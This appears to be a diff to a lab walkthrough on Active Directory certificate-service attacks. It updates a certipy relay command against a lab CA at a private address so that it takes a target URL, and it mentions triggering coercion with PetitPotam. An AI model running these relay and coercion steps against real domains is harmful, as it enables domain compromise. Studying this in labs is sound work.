@@ -67,7 +67,7 @@ Oliver Lyak as done a wonderful job on the ADCS attack tool [certipy](https://gi
 Let's do the same attack with certipy, setup the listener :
 
 ```bash
-certipy relay -ca 192.168.56.23 -template DomainController
+certipy relay -ca 192.168.56.23 -template DomainController -target http://192.168.56.23
 ```
 
 - trig the coerce just like we did before with petitpotam
